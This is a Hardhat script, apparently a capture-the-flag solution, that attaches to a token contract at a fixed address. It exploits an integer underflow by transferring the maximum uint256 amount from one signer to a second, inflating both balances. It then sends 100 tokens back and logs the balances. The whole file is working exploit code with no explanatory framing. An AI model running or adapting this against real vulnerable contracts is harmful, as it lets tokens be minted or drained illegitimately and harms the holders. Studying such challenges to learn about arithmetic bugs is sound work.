import { ethers } from "hardhat";
import fs from "fs";
import path from "path";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0xF6830C221b35380d1ef37C5A5F446612Bc293982";

  const abiPath = path.join(__dirname, "..", "abis", "token.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer1, signer2] = await ethers.getSigners();

  const contract1 = new ethers.Contract(instanceAddress, abiJson, signer1);
  const contract2 = new ethers.Contract(instanceAddress, abiJson, signer2);
  console.log("Attached to contract:", contract1.target);

  // 1) check balances
  console.log(
    "signer1 balance before:",
    (await contract1.balanceOf(signer1.address)).toString()
  );
  console.log(
    "signer2 balance before:",
    (await contract2.balanceOf(signer2.address)).toString()
  );

  // 2) signer1 -> signer2 transfer max units
  const MAX = ethers.MaxUint256;
  const tx1 = await contract1.transfer(signer2.address, MAX, {
    gasLimit: 100000,
  });
  await tx1.wait();
  console.log("tx1:", tx1.hash);

  console.log(
    "signer1 balance after underflow:",
    (await contract1.balanceOf(signer1.address)).toString()
  );
  console.log(
    "signer2 balance after underflow:",
    (await contract2.balanceOf(signer2.address)).toString()
  );

  // 3) signer2 -> signer1 transfer
  const giveBackAmount = ethers.parseEther("100");
  const tx2 = await contract2.transfer(signer1.address, giveBackAmount, {
    gasLimit: 100000,
  });
  await tx2.wait();
  console.log("tx2:", tx2.hash);

  // 4) check final balances
  console.log(
    "signer1 balance final:",
    (await contract1.balanceOf(signer1.address)).toString()
  );
  console.log(
    "signer2 balance final:",
    (await contract2.balanceOf(signer2.address)).toString()
  );
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
